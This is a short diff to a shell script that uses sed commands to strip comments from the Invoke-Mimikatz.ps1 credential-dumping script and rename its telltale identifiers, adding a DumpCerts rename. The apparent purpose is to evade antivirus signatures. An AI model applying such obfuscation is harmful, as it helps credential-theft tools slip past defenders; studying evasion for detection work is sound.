@@ -6,6 +6,8 @@ sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
 
 sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
 
+sed -i -e 's/DumpCerts/DumbKerts/g' Invoke-Mimikatz.ps1
+
 sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
 
 sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
